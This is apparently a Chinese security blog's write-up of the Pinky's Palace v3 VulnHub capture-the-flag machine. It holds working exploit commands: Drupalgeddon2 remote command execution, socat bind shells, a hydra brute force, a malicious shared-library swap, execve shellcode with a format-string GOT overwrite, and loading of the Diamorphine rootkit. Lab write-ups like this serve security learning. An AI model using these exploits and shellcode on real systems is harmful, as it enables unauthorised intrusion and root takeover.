> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ngRCZynD4MG7QdgZ9j951A)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **40** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/jU2bISnUvibnZbnibN8FBQH5OCbpy2RiaqvN4CbAVLGxKnXwKvTYKNBgiavibFHfCtibdicicjjPjKXicZASnmAVicxkRlfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/pinkys-palace-v3,237/

靶机难度：疯狂（CTF）

靶机发布日期：2018 年 5 月 15 日

靶机描述：

无？？？！！！。

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/VJt1QibEWNRfO10Oo0PkHSmDL3qXfsGFDH88uPmn8CgjBFdpap6TpyH2RSslx4l1ZLlas24L9zibRj0RMyoXib4QA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/wDDbichtIRfRxJl7fNxcpfcK7qJ0TaodFDkIiaPRN0a1cwzNlYlLtKZRr1iaOfxoVtaLXMjicgduAoQibfj5YmgkgibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJbXM7odTUxQ1BtlDdtWOvRo5VYwz4iaYtT4GOibCkXHZAYhSjdnJlXjyA/640?wx_fmt=png)

可以看到靶机已经显示 IP 了：

```
192.168.182.138
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJLl45TUT9ibhJooLoG37VroXTyScMI6iauqDr9chcia7vO3tWNTdKb7JQw/640?wx_fmt=png)

nmap 扫到了 21、5555、8000 端口是开放的....8000 上运行了 drupal...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJYVyib3dC1lTFHcFLCMWFibxHalFibMWkNHibo0PID9p6lX5tPbxvet1m3Q/640?wx_fmt=png)

先渗透下 ftp，看到了 welcome 文件..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJPWXh6hWUXGGrcXbJIjAB98mkrjVWGk4ky4HXCReRppLqQFUNw0ef2Q/640?wx_fmt=png)

让我们尽量不要使用 metasploit 工具... 可以在 nmap 扫描上看到 Anonymous 账号密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ4via30geoYI3zZP6M92x5IM6zYH3dwEXwOcUG1tgb3iaW9FnH4tSUjtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJA4TwHsxjDxibpkPbibpHWHvVSTsibPG2vYUibG0DqJfOIgfjY3Z3QfzlWQ/640?wx_fmt=png)

登陆 FTP 发现不能通过 ftp 提权，存在防火墙，进行了限制，对应了上 welcome 文件内容，不能使用 metasploit 工具进行反向 shell 流量攻击...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ1psicRKiceyQibibwyYb99iaIeUGIZ7UH5MVzdfjoTQgIjIiaKqeRWMWZYUQ/640?wx_fmt=png)

这边对 8000web 登陆看看...nmap 前面扫出了几个目录或文件，我都打开看看...（用户 pinkadmin）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJkBJXu89kQCwQehJJPkndMmku9Vw7fnyv9icjRpfibK2HUfCQE3icA9Xng/640?wx_fmt=png)

我都打开看了，发现这个文件有可利用信息...

CHANGELOG.txt（前面 nmap 也扫到了）...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ5K414eFKYduFUNANOJa498Rc5UPia4oViamzehibyqpuGY7VGOyuT07kQ/640?wx_fmt=png)

Drupal 7.57, 2018-02-21，这边了解 drupal 的都知道，列举下：7.58、8.3.9、8.4.6 和 8.5.1 之前的 Drupal 版本容易受到 Drupalgeddon2 的远程代码执行攻击的影响... 这边不能使用 metasploit 模块...CVE-2018-7600 去 gitub 下载看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJz8p2GAXTCYADJwwNoJx5TvVtCaYYmfyGeGxS52OeibPhpCwypibiczvtg/640?wx_fmt=png)

```
[链接](https://www.exploit-db.com/exploits/44449)
```

下载到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJAHEjhNjWbcONke0eWmGBNRNriaYcJF4PSr6Rwj8CaTBuyTbQRHn9CYA/640?wx_fmt=png)

没成功，应该是哪里需要修改下，我进去看看... 这边我在 github 上找到了修改好的针对 drupal8 的 EXP...

```
[链接](https://github.com/dreadlocked/Drupalgeddon2)
```

这边看了会应该是要改 EXP 内容才可以执行成功... 我这边目前还在脑补不会改，继续学习把...

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/wDDbichtIRfRxJl7fNxcpfcK7qJ0TaodFDkIiaPRN0a1cwzNlYlLtKZRr1iaOfxoVtaLXMjicgduAoQibfj5YmgkgibA/640?wx_fmt=png)

我使用了另外一种方法...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ5bWqFkfTPVRxU6u91sudGDygDVYObiaJm8OsPXTEV6qzygibvS00ib4cw/640?wx_fmt=png)

```
python3 ./dayu.py -t 192.168.182.138 -c "cat /etc/passwd" -p 8000
```

这边使用 python3 对靶机的 web 进行命令渗透... 可以看到已经确定可以利用了...

```
[链接](https://github.com/Jack-Barradell/exploits/blob/master/CVE-2018-7600/cve-2018-7600-drupal7.py)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJaq14l8ibfXze5dvI5b3QQRIuNFVueCEPFpYpMjSJnzlWFGNk5jaLc5w/640?wx_fmt=png)

可以看到防火墙阻止了反向 shell... 里头的文件都无法正常执行...

这边我使用了 socat 工具，Socat 是一个非常强大的工具，可用于调整，旋转和获得完全交互式的外壳

```
[链接](https://blog.stalkr.net/2015/12/from-remote-shell-to-remote-terminal.html)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJPu50IARrvL8sL5qym4kF9O9RdJGv6H71hpdYeXryM3vzCaxcIwwmxA/640?wx_fmt=png)

```
python3 ./dayu.py -t 192.168.182.138 -c "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane" -p 8000
```

生成了一个外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ4fZ72ZyAQVh5ObyMM4Axca5lZaGsp7lYwAGFxHzNsxCL0h2pwIYIog/640?wx_fmt=png)

```
socat FILE:`tty`,raw,echo=0 TCP:192.168.182.138:4444
```

可以看到利用 socat 工具已经成功转换了特权... 获得了外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJPFD91A7EDrBmxEFGgLtibgTawe1MlTqRV1FuXpXrVPYrIgWauicWziawA/640?wx_fmt=png)

直接查看 sites/default/settings.php 文件，里面含有 mysql 数据库密码...drupink

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ6dJRUnr3k3lTgyRVXpjwGpsmlXzpXmic4yWegoK9qSezprwEqsFzJ4A/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ0tSkJcxvSbMPzrh0PofS7QBGCfPZiaYicFxeyOUgLmaF6sr66mMOsGCg/640?wx_fmt=png)这边查看到 pinkadmin 用户，密码哈希值这边没破解成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJvxCoBUq37ol4Dmu4t65gSYUue3zzy2jSwZcbYANueMDTLJhTTfZ2Vw/640?wx_fmt=png)

在数据库没发现什么信息了... 哈希值想放着把...（主要我破解不了...）

这边查看运行了那些本地端口，3306 应该是 mysql 的，别的我不太确定， 查看下 apache2 看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJyDpuQjqibDsgiaTGnkuvHriaYtEDD9gkAoHV5ibicpdXW4zjsDibqIVkycZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJmrVxF3ne1zEEg6AQG8mWQ2oKCPaROmsYfJrVtibj2VsFslrm36HERBA/640?wx_fmt=png)

这里可以看到 80 和 65334 端口运行到 localhost 的 Web 服务器...socat 可以建立隧道.. 打开下 65334 看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJwZM4xH44OTYdmkTrFF971AwjZ4Zobl7ib0uKV9Mia9FHITB7SLBcIG0w/640?wx_fmt=png)

```
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:9999,fork TCP:127.0.0.1:65334 &
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJqL3LeRmgLlXXW0WW4ic9mj7PDruNhVdR7FzsiaswsibzVKLibUwNJl6kwQ/640?wx_fmt=png)

nmap 扫，可以看到隧道建立成功了.. 好像存在缓冲区溢出？

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJRa6xJe9AG4LlVSM2WAkUib1ATU1XJdhrEeVaCeL4CiawPXStoDM0DwmQ/640?wx_fmt=png)

可以看出除了要账号密码，还需要 Pin 登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJbpKQEtsQUwrDClFDHd7pKib66EL1euUiblntQ7KZqbZDRovjqwWD90OQ/640?wx_fmt=png)

我尝试 dirb 枚举，没发现什么...

9999 上的服务器是 database 的文件夹中获取的... 但是没提供数据库... 应该是个文件，数据库文件一般是. db 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJb1tehLGBLxekdhgJgUuf4icHVh6rOBnl5znvxgq6xAOibYQ98tD59Nsg/640?wx_fmt=png)

利用 wfuzz 工具并使用了自带的单词表进行爆破... 发现了 pwds.db 数据库文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJxz6hONNtV6oUpo7dvHzTgIiccMLpibgjP8kfrRvvkKHhY2Rlk9tibjprg/640?wx_fmt=png)

可以看到这是一个密码表...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJibObqsYIc44E7Oep8Nb3fqs1tR33HhlcCvZSrolOVibOeicib34ShlEpfQ/640?wx_fmt=png)

我放入本地，用户我目前只发现了四个...

知道了用户名和密码... 回看还需要一个值 pin 进行登陆，我需要生成 1~10000 值得文本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJZNQG2JQL3WfWo4ja13RNUicprwKuoKRZsZS0h941ETQmXvqPZPMARpg/640?wx_fmt=png)

执行生成 1~10000 个数字值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJCeuhTGMNgWPgn69kfKTsNhPPC6rPACm4CExPEwKI6PAh8ibFs4icPlmg/640?wx_fmt=png)

开始爆破...

这边爆破需要长达 10 多个小时... 我重新做了一遍才写的，不小心关了窗口，所以直接告诉你们答案了...

```
hydra -L pins.txt -P dayupasswd.txt 192.168.182.138 -s 8888 http-post-form "/login.php:user=pinkadmin&pass=^PASS^&pin=^USER^:F=Incorrect"
```

这边我一个一个账户进行爆破的... 结果：

```
pinkadmin:AaPinkSecaAdmin4467:55849
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJmc30C4Q1LmzX5OAOkk9Ub3uXxI49sibFEpx5U90mZ7pXz3gvMbsFZZw/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ5ZbCoyLiao6NQRQvl0RMG7KwFiacMm4ia0jmTD4IbrE8nicc2icKS3I703w/640?wx_fmt=png)

这是一个 shell... 我继续通过 socat 进行创建端口隧道...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJSo8nRLyA1qGy4KhANG48mQHHmDK3Oexpg0BlGv3xSRQo9Xyo3tq8PQ/640?wx_fmt=png)

```
socat TCP-LISTEN:2222,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

然后在本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJUPqWgCEU12a83WexLy6jUt8BrVCotH6Jicr224UMCAQFdF5OazSsOpw/640?wx_fmt=png)

```
socat FILE:`tty`,raw,echo=0 TCP:192.168.182.138:2222
```

成功进来了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJJzPXy1vnJ4p4HeIu6qCLw7C7LSCreE0G5MY6oictLLVia8kseQDsmbzg/640?wx_fmt=png)

发现了个二进制文件，放到本地分析看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJV1ru68aRgw0u6ZA6PV9cHJ1I6siaqSdqZBdTDjZ50zytWLCtzho2Csw/640?wx_fmt=png)

```
cp pinksecd ../html
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ5J2RoQwGOLLtBKNxjEoJicP0jsibaTBickZMpemXAicpOsfoOrSdnKA9GA/640?wx_fmt=png)

成功下载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ4LSlUl3YM5QHlB9UicicGtEtzibme9JYwDeCcEJrJtgeVetaHDAtiapB2g/640?wx_fmt=png)

对其做个检查... 红框中的需要注意...@plt 意思是它正在从共享库中加载这些函数...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJdCBh9lUwsiaME0m55kyMjUeZ4Qh6AicmM8tlQypKtZLm6hQVqkMCppog/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJAl4rQPicthIC6Ae15oJE7kqaY0tbp6EMxzYiaZsOZgo3pMZPqEQR0iaBg/640?wx_fmt=png)

果然可以看到是在 libpinksec.so 共享库中加载的函数...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJBPxcGtViauliapnHftLn4ZsiakaGqb7ylD0OP381ehOuXAiac04Dr7Msvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJpOicG8qB2vmluU6UM6ashLibpiaKDjYEYaPkdoe4cYOqKLIeZE2cqcllg/640?wx_fmt=png)

```
cp libpinksec.so /home/pinksec/libpinksec.so.bak
```

   （这边备份下，怕出问题）  

写好 C 木马后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJU6E97iauSiaJ8gpwCEP66jbNahbQFaB507kCMREPye2zfm4CAxBdibEhg/640?wx_fmt=png)

```
gcc -c -fpic dayu.c
gcc -shared dayu.o -o dayu.so
```

这边写好恶意程序的库...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJyyGny7pWF5Rv7Va3dB5uUQaWxoOpy33P9lHOMyAP5ZLJiamzpDkibjZw/640?wx_fmt=png)

我这边发现我无权限将 dayu.so 放入 lib 目录中.. 只能替换了... 重新生成下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJUSVoDyVHEkLRaXZpcCqCTL5RRCApDqQYSib8rYrmkeqSxTGpoRsibXeA/640?wx_fmt=png)

可以看到成功替换了，我前面理解错了.. 其实就是替换该文件... 我放入就无权...

执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJicbPlxSmrToAaAbalxyEzOYbBvERl3IaXSlt29ZEKoLaVAkVwsg1VnQ/640?wx_fmt=png)

三、缓冲区溢出提权

![](https://mmbiz.qpic.cn/mmbiz_png/wDDbichtIRfRxJl7fNxcpfcK7qJ0TaodFDkIiaPRN0a1cwzNlYlLtKZRr1iaOfxoVtaLXMjicgduAoQibfj5YmgkgibA/640?wx_fmt=png)

成功进入 pinksecmanagement 用户...

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ7qEA1MrSyE4Mv6G4rFn1OErdWLic8jKGAapicNpEkDVmXIAupmcNTSOg/640?wx_fmt=png)

这边我还是直接找到 setuid 位的文件... 直接进入 / usr/local/bin / 目录... 发现了 PSMCCLI...

我执行发现无法执行？？因为我是通过 setuid 位提权上来的，所以组还是原来的组，需要提下..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ2lhiburIAwP1RCj4SDct3kXtwrFPDplLzjU42QDX9vb2TIr6W2PGFXA/640?wx_fmt=png)

看到可以执行该程序了... 发现又是缓冲区溢出... 和前几章缓冲区一样...

这边找到溢出位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJEDMIguJl1XxCUy8VgAA4fxCv9xqdG7qHDUIogKgiacVhfT2zu0SrhOg/640?wx_fmt=png)

```
./PSMCCLI $(python -c "print 'A'*250")
```

无法将其崩溃???

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJFXvqpgnCCHIxvk9H0xyUWibUia3k3GFqJ6BMFgDkkseuEDnGL3Nc84AQ/640?wx_fmt=png)

```
./PSMCCLI %x
```

查看到是格式字符串错误...Args: bffffed4  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJdmr68ygvXFjuF52Tot8BUag6db3bHzmsgibSGra5DIVsZ9Oaokia8faA/640?wx_fmt=png)

放到本地分析...（主要靶机啥也没装）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJH48IjPWwfA8MusuXBEeAdm7Pnz23ZAmepgyxSIGw0CGG3y5gP9owHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ5lNhBtrlGO0v5zGLEbGgG3vE1cdattgojsAHBNZkictkqLVb7tguU4A/640?wx_fmt=png)

这边 arg 回送给程序的函数可能是 argshow，查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJlKeD4o6WVgwbdbglRwicITW7hvsiabsr0vsibicwQdSdAGglWOMkAPQdAw/640?wx_fmt=png)

前面查看到是格式字符串溢出... 这边思路覆盖 GOT 中的 putchar 函数... 因为它是 printf 之后的下一个函数，要获取需要覆盖的位置，我在运行程序之前先拆装了 putchar 函数，方便包含它在运行时加载的地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ58nHtiaoGnvfuSVngIHjI9slxIMHD2PFdHtW5XxfRfPPkqVlzibbSmTQ/640?wx_fmt=png)

这边用 shellcode 地址覆盖 0x804a01c 即可... 格式字符串漏洞需要使用 SPAWN 的环境变量来保存 shellcode... 还需要将其定位在内存中...

```
[参考链接](https://github.com/Partyschaum/haxe/blob/master/getenvaddr.c)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJibdjsnkyCk0icxa3RfxLOclPCPZGic6XxH0JEpfxdFy7e6CnOjbGicicx9g/640?wx_fmt=png)

出错了，发现用户不对...gcc 还得回到 pinksec 用户下操作...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJErBZMNmUXV9O5nWOGbbdLKvHAeXDDibIL3HFM0icyYDTHNm8WSfeaicvg/640?wx_fmt=png)

我这边选择了一个 shellcode...

```
[参考链接](http://shell-storm.org/shellcode/files/shellcode-811.php)
```

将其放入环境变量中...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJrhRmarT7k6pzlbficicLjp9QjoIgHA0Rticv7iaSibAPWvBYIq4JNZtrxoA/640?wx_fmt=png)

```
export SPAWN=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```

现在可以在执行目标二进制文件期间找到环境变量在内存中的位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJL5ualtRibg98OQpAQvtknicaibpuxZALa6D3esYlxUahXR8KzibRUKibMZw/640?wx_fmt=png)

```
./getenvaddr SPAWN /usr/local/bin/PSMCCLI
```

将 0xbfffff9e 放入 0x804a01c 中.... 需要确保内存正确对齐...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJCLgKQL0vlgryeibib5uqtuic4DlPVEbZDd1wm3nO2uKLHicktwvvTGytXA/640?wx_fmt=png)

报错... 因为前面 GCC 问题导致退回了 pinksec 用户，重新提权后组又回去了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJOibyWick31NichWJpbEhLgPJvDPC5PDLmVXmqxEKrmYEriatpNdpWnBUGw/640?wx_fmt=png)

```
/usr/local/bin/PSMCCLI AAAABBBB$(python -c "print '%08x.'*200")
```

计划是用要覆盖的内存地址替换 AAAA 和 BBBB（我将覆盖两个 2 字节位置，而不是 14 字节，因为这样容易点）....

可以看到堆栈没有完全对齐 1 个字节，重新调整下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJiaCsJYAMgnGZtb9mficLmxlI7mnrJKt9D7zYPtANKoBibzDl4WIuf8ibUw/640?wx_fmt=png)

```
/usr/local/bin/PSMCCLI AAAABBBBC$(python -c "print '%08x.'*200")
/usr/local/bin/PSMCCLI AAAABBBBCC$(python -c "print '%08x.'*200")
```

可以看出，前面调整还没调过来，继续调整成功对齐...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJiczfUZfkT7WMxFpQ9J0IJ9RnaicBUGl8NQj5oV3ibSCPvuDkxdK9YLLrQ/640?wx_fmt=png)

```
/usr/local/bin/PSMCCLI AAAABBBBCC%124\$x%125\$x
```

这里我确认了 Args 值...124 和 125...

这边用 little-endian 编写，需要将 0xbfffff9e 注入为 0xff9e，然后注入 0xbfff...

0x804a01c with 0xff9e

0x804a01e with 0xbfff

漏洞利用，目标地址转换为 little endian...

```
$(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")
```

将其填充 2 个字节，对应即可

```
$(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ75MjT5FQOyHPjyicOdSCCAbiaS1jm6lMCRgqiaTBgmQ3JGXicd2HOjLtfw/640?wx_fmt=png)

```
/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%124\$n%125\$n
```

这边出现了分段错误，因为％n 将到目前为止已打印的字符数写入正在访问的内存中，上面的代码会将 11（0xb）写入高位和低位存储短字，是一个非法地址，所以报错...

这边要写入的第一个值是 0xff9e（十六进制到十进制转换，十进制为 65438），需要在 \ $ hn 之前打印 65438 字节以写入内存，但是漏洞利用程序已经包含 10 个字节（AAAABBBBCC 共 10 个），因此还需要 65428 个字节...

```
$(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")C%65429x%124\$hn
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJmQ0EpefEyt1o6U8Q3icYvXxMP5ibWNjj1ZzHxqOLgibaucZIR4xjyic0YA/640?wx_fmt=png)

这里我需要写 0xbfff，它是 49151，一个 2 字节无符号 int 的最大值是 65535，因为 65439 已经被打印了 97 将最大值，98 会溢出。然后还需要 49151（加 98 溢出），所以总读取为 0x1bfff-0xff9e =0xc061（49249）...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJOd5MephKqVFtxTAiaFoRjYPhQaDEDPbiccAicny32TSuzg1icEU2z9WoSg/640?wx_fmt=png)

```
/usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%65428x%124\$hn%49249x%125\$hn
```

这边成功通过溢出提权... 这边尝试了 python 无法用.. 使用 ssh 密匙转换壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJib7VaQKu7ZJwDGymWCn5k3ibxt4360jo0nl8Tt06XXSk8X9b2aIYn9GQ/640?wx_fmt=png)

```
ssh-keygen -t rsa -b 2048
```

在本地计算机上生成一个 SSH 密钥，然后 / home/pinksec/.ssh/authorized_keys 在这传输公钥即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJWze1WgWjP0mdflaDrb3YuHQnur1XVmdJkhlpKzGibI2XkzplQsOiaOpw/640?wx_fmt=png)

生成密钥后，放入服务器即可...（前几章也讲过这个了）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJgeObvcrYnatkSjh6WIPq4hWvib0gibnXdIB1PxD7k2LPOpAvFENTaS1w/640?wx_fmt=png)

```
ssh pinky@192.168.182.138 -i dayumis -p 5555
```

成功通过密匙登陆进来... 可以 sudo 提权，看来需要编写自己的内核模块了...

```
[参考链接](https://developer.ibm.com/articles/l-user-space-apps/)
```

这边整了半天，硬是没写出来... 我用了现成的，哎...

```
[链接](https://github.com/m0nad/Diamorphine)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJDcLgboicduibwCHEejibom1sv6lWbANBh3kEAZbpq2NOQHUJ8YLtIeC9w/640?wx_fmt=png)

```
git clone https://github.com/m0nad/Diamorphine
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJoLFUfs3KDMgzWc4YTC60T3gKPbYGz0Q4uw31ccWYRAaSKgFYy2RBfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJJ92eu0ug72684IDwYZr2wiaDQ4Pt282VWiahwKvKnZIZTBYz7qvdJ8xQ/640?wx_fmt=png)

已将 rootkit 加载到目标上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJtNQum4Ficmph0d53koUJiaqvrVnttiaT08X1YJ3iaK4EKI0g26icLCIGUhQ/640?wx_fmt=png)

有了 rootkit 之后，进行设置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJtjMCyWgC1183YrC9hVfJ1ayY1HRr4BSm9yXHV65eXV6GYsHzjvqdiag/640?wx_fmt=png)

```
sudo insmod diamorphine.ko
```

然后将其安装为内核模块...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJcXbdYISwCfBq5ysia6EYSkib6Zltb2InyyKVY7cgafjBGmGdIpGrR9zA/640?wx_fmt=png)

